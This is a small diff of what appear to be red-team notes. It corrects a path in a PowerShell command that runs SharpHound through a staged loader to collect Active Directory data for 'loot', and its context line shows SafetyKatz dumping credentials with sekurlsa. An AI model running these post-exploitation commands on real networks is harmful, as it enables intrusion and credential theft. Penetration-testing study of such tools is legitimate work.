@@ -27,7 +27,7 @@ C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args sekurlsa::
 > In a privileged shell
 
  ```powershell
-C:\Users\Public\\Loader.exe -Path C:\Users\Public\\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
+C:\Users\Public\Loader.exe -Path C:\Users\Public\\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
 ```
 
 > Copy over to A:\loot
